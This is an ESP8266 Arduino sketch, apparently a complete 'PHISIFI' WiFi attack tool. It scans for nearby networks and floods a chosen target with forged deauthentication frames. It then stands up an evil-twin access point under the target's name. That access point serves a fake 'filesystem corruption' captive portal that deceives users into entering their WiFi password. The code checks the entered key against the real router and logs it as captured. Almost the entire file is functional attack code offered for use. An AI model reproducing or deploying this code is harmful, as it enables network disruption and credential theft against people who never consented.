#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
#include "user_interface.h"
}

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;
String _correct = "";
String _tryPassword = "";
bool hotspot_active = false;
bool deauthing_active = false;

// UI Strings
#define SUBTITLE "NETWORK SECURITY SYSTEM"
#define TITLE "<span class='warn'>&#9888;</span> Critical System Error"
#define BODY "Your Wireless Router has detected a filesystem corruption. To prevent permanent hardware damage and restore your internet connection, please verify your network security key."

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _networks[i].ssid = "";
    _networks[i].ch = 0;
    memset(_networks[i].bssid, 0, 6);
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0";
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

// --- CSS and HTML ---
String getHeader(String t, bool isAdmin = false) {
  String a = (_selectedNetwork.ssid == "") ? "Router" : _selectedNetwork.ssid;
  String themeColor = isAdmin ? "#00ff41" : "#58a6ff";
  String bgColor = isAdmin ? "#000000" : "#0d1117";
  String textColor = isAdmin ? "#00ff41" : "#c9d1d9";
  
  String CSS = "body { background: " + bgColor + "; color: " + textColor + "; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }"
               ".nav { background: #161b22; padding: 15px; border-bottom: 2px solid " + themeColor + "; box-shadow: 0 4px 10px rgba(0,0,0,0.5); display: flex; justify-content: space-between; align-items: center; }"
               ".nav b { font-size: 1.4em; letter-spacing: 1px; color: " + themeColor + "; }"
               ".container { max-width: 600px; margin: 30px auto; padding: 20px; background: #161b22; border-radius: 12px; border: 1px solid #30363d; }"
               "h1 { color: #f85149; font-size: 1.6em; text-align: center; border-bottom: 1px solid #30363d; padding-bottom: 10px; }"
               ".warn { color: #f0883e; }"
               "input[type=password], input[type=text] { width: 100%; padding: 12px; margin: 15px 0; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #fff; box-sizing: border-box; }"
               "button, input[type=submit] { width: 100%; padding: 12px; background: " + themeColor + "; color: #000; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.3s; }"
               "button:hover { opacity: 0.8; box-shadow: 0 0 10px " + themeColor + "; }"
               "table { width: 100%; border-collapse: collapse; margin-top: 15px; border: 1px solid #30363d; }"
               "th, td { padding: 10px; text-align: left; border-bottom: 1px solid #30363d; font-size: 0.9em; }"
               "th { background: #21262d; color: " + themeColor + "; }"
               ".status { background: #0d1117; padding: 15px; border-radius: 8px; border-left: 4px solid " + themeColor + "; margin-bottom: 20px; font-size: 0.95em; line-height: 1.5; }"
               ".footer { text-align: center; margin-top: 30px; color: #8b949e; font-size: 0.8em; }";

  if (isAdmin) {
    CSS += ".terminal { font-family: 'Courier New', monospace; }"
           ".log { background: #050505; color: #00ff41; padding: 10px; height: 120px; overflow-y: auto; border: 1px solid #00ff41; margin-top: 15px; font-size: 0.85em; }";
  }

  return "<!DOCTYPE html><html><head><title>" + a + " :: " + t + "</title>"
         "<meta name='viewport' content='width=device-width,initial-scale=1'>"
         "<style>" + CSS + "</style><meta charset='UTF-8'></head>"
         "<body><div class='nav'><b>" + a + "</b> <span style='font-size:0.8em; color:#8b949e;'>" + SUBTITLE + "</span></div>"
         "<div class='container' " + (isAdmin ? "class='terminal'" : "") + "><h1>" + t + "</h1>";
}

String getFooter() {
  return "</div><div class='footer'>&copy; 2024 Network Security Systems.</div></body></html>";
}

// --- Handlers ---
void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", getHeader("Verification Failed") + 
      "<div style='text-align:center; color:#f85149;'><h2 style='font-size:40px;'>&#10008;</h2>"
      "<p>Incorrect password. The system could not verify your identity.</p>"
      "<p>Please try again to resume recovery.</p></div>"
      "<script>setTimeout(function(){window.location.href = '/';}, 3000);</script>" + getFooter());
  } else {
    _correct = "SUCCESS! Target: " + _selectedNetwork.ssid + " | Key: " + _tryPassword;
    hotspot_active = false;
    deauthing_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("WiFi_Recovery_System", "administrator");
    dnsServer.start(DNS_PORT, "*", apIP);
    Serial.println("\n[!] KEY CAPTURED: " + _correct);
  }
}

void handleAdmin() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    deauthing_active = (webServer.arg("deauth") == "start");
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start" && _selectedNetwork.ssid != "") {
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);
    } else {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP("WiFi_Recovery_System", "administrator");
      dnsServer.start(DNS_PORT, "*", apIP);
    }
  }

  String _html = getHeader("PHISIFI_CONSOLE_V2", true);
  _html += "<div>"
           "<form style='display:inline;' method='post' action='/admin?deauth=" + String(deauthing_active ? "stop" : "start") + "'>"
           "<button " + (_selectedNetwork.ssid == "" ? "disabled" : "") + ">" + (deauthing_active ? "STOP_ATTACK" : "DEAUTH_TARGET") + "</button></form> "
           "<form style='display:inline;' method='post' action='/admin?hotspot=" + String(hotspot_active ? "stop" : "start") + "'>"
           "<button " + (_selectedNetwork.ssid == "" ? "disabled" : "") + ">" + (hotspot_active ? "STOP_PORTAL" : "START_EVIL_TWIN") + "</button></form>"
           "</div>";

  _html += "<table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>ACTION</th></tr>";
  for (int i = 0; i < 16; i++) {
    if (_networks[i].ssid == "") break;
    String mac = bytesToStr(_networks[i].bssid, 6);
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + mac + "</td><td>" + String(_networks[i].ch) + "</td>"
             "<td><form method='post' action='/admin?ap=" + mac + "'>"
             "<button " + (mac == bytesToStr(_selectedNetwork.bssid, 6) ? "style='background:#fff;'" : "") + ">" + 
             (mac == bytesToStr(_selectedNetwork.bssid, 6) ? "SELECTED" : "SELECT") + "</button></form></td></tr>";
  }
  _html += "</table>";
  
  _html += "<div class='log'>[SYS] Status: " + String(deauthing_active ? "ATTACKING" : "IDLE") + "<br>" +
           "[SYS] Selected: " + _selectedNetwork.ssid + "<br>" +
           (_correct != "" ? "[SUCCESS] Captured: " + _correct : "[MSG] Waiting for credentials...") + "</div>";
  
  _html += getFooter();
  webServer.send(200, "text/html", _html);
}

void handleIndex() {
  if (hotspot_active) {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", getHeader("System Check") + 
        "<div style='text-align:center;'><p>Verifying network integrity...</p>"
        "<progress style='width:100%;' value='45' max='100'></progress>"
        "<p>Please wait. Validation takes ~15 seconds.</p></div>"
        "<script>setTimeout(function(){window.location.href = '/result';}, 12000);</script>" + getFooter());
    } else {
      webServer.send(200, "text/html", getHeader(TITLE) + "<div class='status'>" + BODY + "</div>" +
        "<form action='/' method='post'><label>Network Password:</label>" +
        "<input type='password' name='password' placeholder='Enter password' minlength='8' required>" +
        "<input type='submit' value='Begin Recovery'></form>" + getFooter());
    }
  } else {
    handleAdmin();
  }
}

void performScan() {
  Serial.println("[*] Scanning...");
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; i++) {
      _networks[i].ssid = WiFi.SSID(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
      _networks[i].ch = WiFi.channel(i);
    }
  }
  Serial.println("[+] Found " + String(n) + " networks");
}

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n\n####################################");
  Serial.println("#      ESP8266 PHISIFI V2.0        #");
  Serial.println("#    Hacker Edition by Tanzeel     #");
  Serial.println("####################################");
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("WiFi_Recovery_System", "administrator");
  
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  
  Serial.println("[+] System Ready. Admin: http://192.168.4.1/admin");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && _selectedNetwork.ssid != "") {
    static unsigned long lastDeauth = 0;
    if (millis() - lastDeauth >= 500) {
      wifi_set_channel(_selectedNetwork.ch);
      uint8_t pkt[26] = {0xC0, 0x00, 0x31, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};
      memcpy(&pkt[10], _selectedNetwork.bssid, 6);
      memcpy(&pkt[16], _selectedNetwork.bssid, 6);
      pkt[0] = 0xC0; wifi_send_pkt_freedom(pkt, 26, 0);
      pkt[0] = 0xA0; wifi_send_pkt_freedom(pkt, 26, 0);
      lastDeauth = millis();
    }
  }

  static unsigned long lastScan = 0;
  if (millis() - lastScan >= 15000 && !hotspot_active) {
    performScan();
    lastScan = millis();
  }
}
